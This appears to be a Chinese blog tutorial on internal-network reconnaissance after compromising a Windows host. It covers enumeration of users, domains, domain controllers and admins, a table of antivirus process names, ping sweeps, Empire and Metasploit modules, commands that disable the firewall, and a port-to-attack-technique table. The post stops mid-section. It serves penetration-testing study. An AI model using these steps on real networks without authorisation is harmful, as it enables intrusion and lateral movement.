<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505085612101.png" alt="image-20200505085612101"></p>
<p>注：有的系统不可用，我在win10上用wmic /?，以弃用，别人说在win2012R2,win7可以用</p>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505090205953.png" alt="image-20200505090205953" style="zoom:150%;">

<h3 id="powershell替代命令"><a href="#powershell替代命令" class="headerlink" title="powershell替代命令"></a>powershell替代命令</h3><ul>
<li>Get-WmiObject -class win32_product | Select-Object  -property name ,version</li>
</ul>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505090514148.png" alt="image-20200505090514148"></p>
<h2 id="查询本机服务"><a href="#查询本机服务" class="headerlink" title="查询本机服务"></a>查询本机服务</h2><ul>
<li>wmic service list brief</li>
</ul>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505091145138.png" alt="image-20200505091145138"></p>
<h2 id="查询进程"><a href="#查询进程" class="headerlink" title="查询进程"></a>查询进程</h2><ul>
<li>talklist</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505091242672.png" alt="image-20200505091242672" style="zoom:200%;">

<ul>
<li>wmic process list brief</li>
</ul>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505091342931.png" alt="image-20200505091342931"></p>
<ul>
<li>qprocess *</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505140059112.png" alt="image-20200505140059112" style="zoom:200%;">

<blockquote>
<ul>
<li>常见的杀软进程：</li>
</ul>
<table>
<thead>
<tr>
<th>进程名</th>
<th>软件</th>
</tr>
</thead>
<tbody><tr>
<td>360sd.exe</td>
<td>360杀毒</td>
</tr>
<tr>
<td>360tray.exe</td>
<td>360实时保护</td>
</tr>
<tr>
<td>ZhuDongFangYu.exe</td>
<td>360主动防御</td>
</tr>
<tr>
<td>KSafeTray.exe</td>
<td>金山卫士</td>
</tr>
<tr>
<td>SafeDogUpdateCenter.exe</td>
<td>安全狗</td>
</tr>
<tr>
<td>McAfee McShield.exe</td>
<td>McAfee</td>
</tr>
<tr>
<td>egui.exe</td>
<td>NOD32</td>
</tr>
<tr>
<td>AVP.exe</td>
<td>卡巴斯基</td>
</tr>
<tr>
<td>avguard.exe</td>
<td>小红伞</td>
</tr>
<tr>
<td>bdagent.exe</td>
<td>BitDefender</td>
</tr>
</tbody></table>
</blockquote>
<p>获取软件安装路径</p>
<ul>
<li>wmic process where(description=”mysqld.exe”)&gt;&gt;mysql.log</li>
</ul>
<h2 id="查看已启动的程序信息"><a href="#查看已启动的程序信息" class="headerlink" title="查看已启动的程序信息"></a>查看已启动的程序信息</h2><ul>
<li>wmic startup get command.caption</li>
</ul>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505091604430.png" alt="image-20200505091604430"></p>
<h2 id="查看计划任务"><a href="#查看计划任务" class="headerlink" title="查看计划任务"></a>查看计划任务</h2><ul>
<li>schtasks /query /fo LIST /v</li>
</ul>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505091811443.png" alt="image-20200505091811443"></p>
<p>注：有的版本可能看不了，</p>
<blockquote>
<p>此处在我的靶机Server2008R2中出现了错误：无法加载列资源，这里把编码暂时设置为英文：<code>chcp 437</code>，之后再改回来：<code>chcp 936</code>即可</p>
</blockquote>
<h2 id="查看主机开机时间"><a href="#查看主机开机时间" class="headerlink" title="查看主机开机时间"></a>查看主机开机时间</h2><ul>
<li>net statistics workstation</li>
</ul>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505092016966.png" alt="image-20200505092016966"></p>
<h2 id="查看登录到这台服务器的计算机"><a href="#查看登录到这台服务器的计算机" class="headerlink" title="查看登录到这台服务器的计算机"></a>查看登录到这台服务器的计算机</h2><ul>
<li>echo %logonserver%</li>
</ul>
<h2 id="查看用户列表"><a href="#查看用户列表" class="headerlink" title="查看用户列表"></a>查看用户列表</h2><p>与 net user /domain 不同</p>
<ul>
<li>net user</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505092113646.png" alt="image-20200505092113646" style="zoom:150%;">

<h2 id="查看本地管理员信息"><a href="#查看本地管理员信息" class="headerlink" title="查看本地管理员信息"></a>查看本地管理员信息</h2><ul>
<li>net localgroup administrators</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505092259302.png" alt="image-20200505092259302" style="zoom:150%;">

<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505092350422.png" alt="image-20200505092350422"></p>
<h2 id="查看当前在线的用户"><a href="#查看当前在线的用户" class="headerlink" title="查看当前在线的用户"></a>查看当前在线的用户</h2><ul>
<li>query user || qwinsta</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505092520293.png" alt="image-20200505092520293" style="zoom:150%;">

<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505092531518.png" alt="image-20200505092531518" style="zoom:150%;">

<h2 id="查看本地计算机与所连接客户端之间的会话"><a href="#查看本地计算机与所连接客户端之间的会话" class="headerlink" title="查看本地计算机与所连接客户端之间的会话"></a>查看本地计算机与所连接客户端之间的会话</h2><ul>
<li>net session</li>
</ul>
<blockquote>
<p>对于该指令，一开始我的机器上报错：”发生系统错误5。拒绝访问”，找了一下解决办法，只要以管理员身份运行即可，此处靶机没有回话，所以显示为空<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200423113727-c09d0fcc-8513-1.png" target="_blank" rel="noopener"><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20200423113727-c09d0fcc-8513-1.png" alt="img"></a></p>
</blockquote>
<h2 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h2><ul>
<li>netstat -ano</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505093135040.png" alt="image-20200505093135040" style="zoom:150%;">

<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505092829887.png" alt="image-20200505092829887" style="zoom:150%;">

<h2 id="查看补丁信息"><a href="#查看补丁信息" class="headerlink" title="查看补丁信息"></a>查看补丁信息</h2><ul>
<li>systeminfo可以</li>
<li>wmic qfe get caption,description,hotfixid,installedon</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505093006349.png" alt="image-20200505093006349" style="zoom:150%;">

<h2 id="查看本机共享列表"><a href="#查看本机共享列表" class="headerlink" title="查看本机共享列表"></a>查看本机共享列表</h2><ul>
<li>net share</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505093339613.png" alt="image-20200505093339613" style="zoom:150%;">

<ul>
<li>wmic share get name,path.status</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505093452485.png" alt="image-20200505093452485" style="zoom: 200%;">

<h2 id="查询路由表及所有可用的ARP缓存表"><a href="#查询路由表及所有可用的ARP缓存表" class="headerlink" title="查询路由表及所有可用的ARP缓存表"></a>查询路由表及所有可用的ARP缓存表</h2><ul>
<li>route print</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505093557840.png" alt="image-20200505093557840" style="zoom:150%;">

<ul>
<li>arp -a</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505093713636.png" alt="image-20200505093713636" style="zoom:200%;">

<h2 id="查看防火墙配置"><a href="#查看防火墙配置" class="headerlink" title="查看防火墙配置"></a>查看防火墙配置</h2><ul>
<li>netsh firewall show config</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505093915889.png" alt="image-20200505093915889" style="zoom:150%;">

<h2 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h2><ul>
<li>win2003前：netsh firewall set opmode disable</li>
<li>win2003后：netsh advfirewall set allprofiles state off</li>
</ul>
<blockquote>
<p>一般来说不要操作防火墙的开关，风险极大，只需要查看配置即可</p>
</blockquote>
<h2 id="查看代理"><a href="#查看代理" class="headerlink" title="查看代理"></a>查看代理</h2><ul>
<li>reg query “HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings”</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505094325659.png" alt="image-20200505094325659" style="zoom:150%;">

<h2 id="查询远程连接服务"><a href="#查询远程连接服务" class="headerlink" title="查询远程连接服务"></a>查询远程连接服务</h2><ul>
<li>reg query “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Control\Terminal Server\WinStations\RDP-Tcp” /v PortNumber</li>
</ul>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505094659459.png" alt="image-20200505094659459"></p>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505094735891.png" alt="image-20200505094735891"></p>
<blockquote>
<p>连接端口为16进制数0xd3d，转换为10进制就是3389</p>
</blockquote>
<blockquote>
<h3 id="使用empire收集信息"><a href="#使用empire收集信息" class="headerlink" title="使用empire收集信息"></a>使用empire收集信息</h3><p>在攻击机上安装empire后，使用<code>usemodule powershell/situational_awareness/host/winenum</code>即可收集相关信息，注意使用该模块需要拿到管理员权限</p>
</blockquote>
<h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><h3 id="查看当前权限"><a href="#查看当前权限" class="headerlink" title="查看当前权限"></a>查看当前权限</h3><ul>
<li>whoami</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505095057090.png" alt="image-20200505095057090" style="zoom: 200%;">

<h3 id="获取域id"><a href="#获取域id" class="headerlink" title="获取域id"></a>获取域id</h3><ul>
<li>whoami /all</li>
</ul>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505095151881.png" alt="image-20200505095151881"></p>
<h2 id="获取指定用户的详细信息"><a href="#获取指定用户的详细信息" class="headerlink" title="获取指定用户的详细信息"></a>获取指定用户的详细信息</h2><ul>
<li>net user xxx /domain</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505095317773.png" alt="image-20200505095317773" style="zoom: 150%;">

<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505095421848.png" alt="image-20200505095421848" style="zoom:150%;">

<h2 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h2><ul>
<li>ipconfig /all</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505095542250.png" alt="image-20200505095542250" style="zoom:150%;">

<ul>
<li>用nslookup解析域名的ip,来判断dns服务器与域控是否在同一主机上</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505095809931.png" alt="image-20200505095809931" style="zoom:150%;">

<h2 id="查询当前登录域与用户信息"><a href="#查询当前登录域与用户信息" class="headerlink" title="查询当前登录域与用户信息"></a>查询当前登录域与用户信息</h2><ul>
<li>net config workstation</li>
</ul>
<p>de1ta靶机未成功，<a href="https://xz.aliyun.com/t/7663" target="_blank" rel="noopener">用的先知的图</a></p>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20200423114108-44acd9b4-8514-1.png" alt="img" style="zoom:150%;">

<h2 id="判断主域"><a href="#判断主域" class="headerlink" title="判断主域"></a>判断主域</h2><ul>
<li>net time /domain</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505100133137.png" alt="image-20200505100133137" style="zoom:200%;">

<blockquote>
<p>若是此命令在显示域处显示WORKGROUP，则不存在域，若是报错：发生系统错误5，则存在域，但该用户不是域用户</p>
</blockquote>
<h2 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h2><p>icmp</p>
<ul>
<li>for /L %I in (1,1,20) DO @ping -w 1 -n 1 192.168.0.%I | findstr “TTL=”</li>
<li>for /l %i in (1,1,255) do @ ping 192.168.0.%i -w 1 -n 1 | find /i “ttl=”</li>
</ul>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505100619516.png" alt="image-20200505100619516"></p>
<blockquote>
<p>利用empire中的arpscan模块：<code>usemodule situational_awareness/network/arpscan</code>，设置Range(范围)后即可扫描</p>
</blockquote>
<h2 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h2><blockquote>
<ul>
<li>使用telnet进行扫描：<code>telnet 主机名 22</code></li>
<li>使用metasploit进行扫描：<code>需要用到的是auxiliar/scanner/portscan/ack、ftpbounce、syn、tcp、xmas</code>等模块</li>
<li>PowerSploit中的Invoke-Portscan.ps1脚本，位于Recon目录下</li>
<li>使用Nishang的PortScan模块，位于scan目录下，上传到主机上执行</li>
</ul>
</blockquote>
<h2 id="获取banner"><a href="#获取banner" class="headerlink" title="获取banner"></a>获取banner</h2><blockquote>
<p>扫描到端口后就要获取到其Banner信息，接着就可以在漏洞库里查找poc，这个可以找一下常见的端口的服务来得知</p>
<table>
<thead>
<tr>
<th>端口号</th>
<th>端口说明</th>
<th>攻击技巧</th>
</tr>
</thead>
<tbody><tr>
<td>21/22/69</td>
<td>ftp/tftp：文件传输协议</td>
<td>允许匿名上传、下载、爆破、嗅探、溢出和后门</td>
</tr>
<tr>
<td>22</td>
<td>ssh：远程连接</td>
<td>爆破OpenSSH；28个退格</td>
</tr>
<tr>
<td>23</td>
<td>telnet：远程连接</td>
<td>爆破\嗅探、弱口令</td>
</tr>
<tr>
<td>25</td>
<td>smtp：邮件服务</td>
<td>邮件伪造</td>
</tr>
<tr>
<td>53</td>
<td>DNS：域名系统</td>
<td>DNS区域传输\DNS劫持\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙</td>
</tr>
<tr>
<td>67/68</td>
<td>dhcp</td>
<td>劫持\欺骗</td>
</tr>
<tr>
<td>80/443/8080</td>
<td>常见web服务端口</td>
<td>web攻击、爆破、对应服务器版本漏洞</td>
</tr>
<tr>
<td>110</td>
<td>pop3</td>
<td>爆破、嗅探</td>
</tr>
<tr>
<td>139</td>
<td>samba</td>
<td>爆破\未授权访问\远程代码执行</td>
</tr>
<tr>
<td>143</td>
<td>imap</td>
<td>爆破</td>
</tr>
<tr>
<td>161</td>
<td>snmp</td>
<td>爆破</td>
</tr>
<tr>
<td>389</td>
<td>ldap目录访问协议</td>
<td>注入攻击\未授权访问，弱口令</td>
</tr>
<tr>
<td>512/513/514</td>
<td>linux rexec</td>
<td>直接使用rlogin\爆破</td>
</tr>
<tr>
<td>873</td>
<td>rsync</td>
<td>未授权访问\文件上传</td>
</tr>
<tr>
<td>1080</td>
<td>socket</td>
<td>爆破：进行内网渗透</td>
</tr>
<tr>
<td>1352</td>
<td>lotus Domino邮件服务</td>
<td>爆破：弱口令\信息泄漏：源代码</td>
</tr>
<tr>
<td>1433</td>
<td>mssql</td>
<td>爆破：使用系统用户登录\注入攻击\SA弱口令</td>
</tr>
<tr>
<td>1521</td>
<td>oracle</td>
<td>爆破：TNS\注入攻击\反弹shell</td>
</tr>
<tr>
<td>2049</td>
<td>nfs</td>
<td>配置不当</td>
</tr>
<tr>
<td>2181</td>
<td>zookeeper</td>
<td>未授权访问</td>
</tr>
<tr>
<td>3306</td>
<td>mysql</td>
<td>爆破\拒绝服务\注入\提权</td>
</tr>
<tr>
<td>3389</td>
<td>rdp</td>
<td>爆破\Shift后门</td>
</tr>
<tr>
<td>3690</td>
<td>SVN服务</td>
<td>SVN泄露\未授权访问</td>
</tr>
<tr>
<td>4848</td>
<td>glassfish</td>
<td>爆破：控制台弱口令\认证绕过</td>
</tr>
<tr>
<td>5000</td>
<td>sybase/DB2</td>
<td>爆破\注入</td>
</tr>
<tr>
<td>5432</td>
<td>postgresql</td>
<td>缓冲区溢出\注入攻击\爆破：弱口令</td>
</tr>
<tr>
<td>5632</td>
<td>pcanywhere</td>
<td>拒绝服务\代码执行，抓取密码</td>
</tr>
<tr>
<td>5900</td>
<td>vnc</td>
<td>爆破：弱口令\认证绕过</td>
</tr>
<tr>
<td>6379</td>
<td>redis</td>
<td>未授权访问\爆破：弱口令</td>
</tr>
<tr>
<td>7001/7002</td>
<td>weblogic</td>
<td>Java反序列化\控制台弱口令\控制台部署webshell</td>
</tr>
<tr>
<td>8069</td>
<td>zabbix</td>
<td>远程命令执行\SQL注入</td>
</tr>
<tr>
<td>8080/8089</td>
<td>JBoss/Resin/Jetty/Jenkins</td>
<td>反序列化、控制台弱口令</td>
</tr>
<tr>
<td>9090</td>
<td>websphere控制台</td>
<td>爆破：控制台弱口令\Java反序列</td>
</tr>
<tr>
<td>9200/9300</td>
<td>elasticsearch</td>
<td>远程代码执行</td>
</tr>
<tr>
<td>10000</td>
<td>webmin控制面板</td>
<td>弱口令</td>
</tr>
<tr>
<td>11211</td>
<td>memcacache</td>
<td>未授权访问</td>
</tr>
<tr>
<td>27017/27018</td>
<td>mongodb</td>
<td>爆破\未授权访问</td>
</tr>
<tr>
<td>50000</td>
<td>SAP Management Console</td>
<td>远程执行</td>
</tr>
</tbody></table>
</blockquote>
<h2 id="获取域内的基础信息"><a href="#获取域内的基础信息" class="headerlink" title="获取域内的基础信息"></a>获取域内的基础信息</h2><h3 id="查询域"><a href="#查询域" class="headerlink" title="查询域"></a>查询域</h3><ul>
<li>net view /domain  用来查询当前环境存在几个域</li>
</ul>
<p>de1ta靶机报错，<a href="https://xz.aliyun.com/t/7663" target="_blank" rel="noopener">参考先知图片</a></p>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20200423114253-83737004-8514-1.png" alt="img" style="zoom: 200%;">

<h3 id="查询域内所有计算机"><a href="#查询域内所有计算机" class="headerlink" title="查询域内所有计算机"></a>查询域内所有计算机</h3><ul>
<li>net view /domain:域名</li>
</ul>
<p>de1ta靶机报错，<a href="https://xz.aliyun.com/t/7663" target="_blank" rel="noopener">参考先知图片</a></p>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20200423114325-95fac128-8514-1.png" alt="img" style="zoom:200%;">

<h3 id="查询域内所有用户组"><a href="#查询域内所有用户组" class="headerlink" title="查询域内所有用户组"></a>查询域内所有用户组</h3><ul>
<li>net group /domain</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505101849441.png" alt="image-20200505101849441" style="zoom:150%;">

<h3 id="查询所有域成员计算机列表"><a href="#查询所有域成员计算机列表" class="headerlink" title="查询所有域成员计算机列表"></a>查询所有域成员计算机列表</h3><ul>
<li>net  group “domain computers” /domain</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505141419870.png" alt="image-20200505141419870" style="zoom:150%;">

<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20200423114350-a50c7288-8514-1.png" alt="img" style="zoom:200%;">

<h3 id="获取域密码信息"><a href="#获取域密码信息" class="headerlink" title="获取域密码信息"></a>获取域密码信息</h3><ul>
<li>net accounts /domain</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505103458760.png" alt="image-20200505103458760" style="zoom:150%;">

<h3 id="获取域信任信息"><a href="#获取域信任信息" class="headerlink" title="获取域信任信息"></a>获取域信任信息</h3><ul>
<li>nltest /domain_trusts</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505103739277.png" alt="image-20200505103739277" style="zoom:200%;">

<h2 id="寻找域控"><a href="#寻找域控" class="headerlink" title="寻找域控"></a>寻找域控</h2><h3 id="查看域控机器名"><a href="#查看域控机器名" class="headerlink" title="查看域控机器名"></a>查看域控机器名</h3><ul>
<li>nltest /DCLIST:域名  </li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505103955222.png" alt="image-20200505103955222" style="zoom:200%;">

<h3 id="查看域控主机名"><a href="#查看域控主机名" class="headerlink" title="查看域控主机名"></a>查看域控主机名</h3><ul>
<li>nslookup -type=SRV _ladp._tcp</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505104206938.png" alt="image-20200505104206938" style="zoom:150%;">

<h3 id="查看域控制器组"><a href="#查看域控制器组" class="headerlink" title="查看域控制器组"></a>查看域控制器组</h3><ul>
<li>net  group “Domain Controllers”  /domain</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505104348725.png" alt="image-20200505104348725" style="zoom:150%;">

<ul>
<li>netdom query pdc</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505104452989.png" alt="image-20200505104452989" style="zoom:200%;">

<h2 id="获取域内用户和管理员信息"><a href="#获取域内用户和管理员信息" class="headerlink" title="获取域内用户和管理员信息"></a>获取域内用户和管理员信息</h2><h3 id="查询所有域用户列表"><a href="#查询所有域用户列表" class="headerlink" title="查询所有域用户列表"></a>查询所有域用户列表</h3><ul>
<li>net user /domain</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505104604612.png" alt="image-20200505104604612" style="zoom:150%;">

<h3 id="获取域内用户的详细信息"><a href="#获取域内用户的详细信息" class="headerlink" title="获取域内用户的详细信息"></a>获取域内用户的详细信息</h3><ul>
<li>wmic useraccount get /all</li>
</ul>
<p>可以查询到sid</p>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200507155219302.png" alt="image-20200507155219302"></p>
<h3 id="查询存在的用户"><a href="#查询存在的用户" class="headerlink" title="查询存在的用户"></a>查询存在的用户</h3><ul>
<li>dsquery user</li>
</ul>
<p>de1ta靶机报错，<a href="https://xz.aliyun.com/t/7663" target="_blank" rel="noopener">参考先知图片</a></p>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20200423114528-df6fb5a2-8514-1.png" alt="img" style="zoom:200%;">

<p>本地dsquery命令不存在</p>
<h2 id="查询本地管理员组用户"><a href="#查询本地管理员组用户" class="headerlink" title="查询本地管理员组用户"></a>查询本地管理员组用户</h2><ul>
<li>net localgroup administrators</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505105728041.png" alt="image-20200505105728041" style="zoom:200%;">

<h2 id="查询域管理员用户组"><a href="#查询域管理员用户组" class="headerlink" title="查询域管理员用户组"></a><strong>查询域管理员用户组</strong></h2><ul>
<li>net group “domain admins”  /domain</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505105826739.png" alt="image-20200505105826739" style="zoom:200%;">

<h2 id="查询管理员用户组"><a href="#查询管理员用户组" class="headerlink" title="查询管理员用户组"></a>查询管理员用户组</h2><ul>
<li>net  group  “Enterprise Admins” /domain</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505110038499.png" alt="image-20200505110038499" style="zoom:200%;">

<h2 id="定位域管理员"><a href="#定位域管理员" class="headerlink" title="定位域管理员"></a>定位域管理员</h2><blockquote>
<p>常规渠道有二个，日志与会话，日志是本地机器的管理员日志，可以用脚本或者内置应用wevtutil导出来看<br>### 工具<br><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon" target="_blank" rel="noopener">psloggedon.exe</a>，<a href="https://github.com/mubix/netview" target="_blank" rel="noopener">netview.exe</a>，<a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn" target="_blank" rel="noopener">PVEFindADUser.exe</a>，powersploit的PowerView脚本，Empire的user_hunter模块等</p>
</blockquote>
<h2 id="查找域管理进程"><a href="#查找域管理进程" class="headerlink" title="查找域管理进程"></a>查找域管理进程</h2><h3 id="列出本机的所有进程及进程用户"><a href="#列出本机的所有进程及进程用户" class="headerlink" title="列出本机的所有进程及进程用户"></a>列出本机的所有进程及进程用户</h3><ul>
<li>tasklist /v</li>
</ul>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505110813873.png" alt="image-20200505110813873"></p>
<blockquote>
<p>在以上进程中尽量查找域管理员进程或是与其相关的进程</p>
</blockquote>
<h2 id="查找域控的域用户会话"><a href="#查找域控的域用户会话" class="headerlink" title="查找域控的域用户会话"></a>查找域控的域用户会话</h2><blockquote>
